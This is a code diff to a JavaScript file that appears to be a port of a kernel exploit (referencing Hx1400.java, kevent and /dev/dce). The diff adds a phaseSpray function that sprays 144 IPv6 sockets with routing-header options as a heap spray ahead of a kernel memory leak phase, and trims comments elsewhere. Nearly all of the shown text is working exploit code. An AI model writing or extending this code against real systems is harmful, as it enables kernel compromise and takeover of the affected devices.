@@ -20,7 +20,7 @@ const TPL_HI = 0x54545454;
 const DEV_DCE = "/dev/dce";
 const OPS_OFF = 0x985a;
 
-// The exact CANDS array from Hx1400.java line 151
+// Exact CANDS array from Hx1400.java
 const CANDS = [128, 96, 160, 64, 192, 32, 224, 120, 136, 88, 104, 152, 168, 56, 72, 184, 200, 24, 40, 216, 232, 8, 16, 48, 80, 112, 144, 176, 208, 240];
 const ROUNDS = 6;
 
@@ -187,6 +187,23 @@ function marked(fd, rdb, lenp) {
   return (rdb.dv.getUint32(8, true) >>> 0) === TPL_LO && (rdb.dv.getUint32(12, true) >>> 0) === TPL_HI;
 }
 
+function phaseSpray(N) {
+  const fds = [];
+  for (let i = 0; i < N; i++) {
+    const fd = scn("socket", AF_INET6, SOCK_DGRAM, 0);
+    if (fd <= 0) break;
+    fds.push(fd);
+  }
+  if (fds.length < 128) fin("spray n=" + fds.length + " <128");
+  log("SPRAY", "sockets=" + fds.length);
+  const rth = allocBuf(512);
+  for (const fd of fds) {
+    scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, rth.addr, RTH_LEN, 0);
+  }
+  log("ARMS", "armed=" + fds.length + " size=" + RTH_LEN);
+  return { fds, rth };
+}
+
 function phase2Leak(rootKq, fds) {
   const rdb = allocBuf(512);
   const lenp = allocBuf(8);
@@ -304,7 +321,7 @@ export async function runKevent(c) {
   ensureStubs();
 
   const anchorFd = scn("socket", AF_INET6, SOCK_DGRAM, 0);
-  const { fds } = phaseSpray(144); // Exact Java spray size
+  const { fds } = phaseSpray(144); 
 
   const mr = scn64("mmap", 0, 16384, 3, 4098, -1, 0);
   const page = (BigInt(mr.hi >>> 0) << 32n) | BigInt(mr.lo >>> 0);
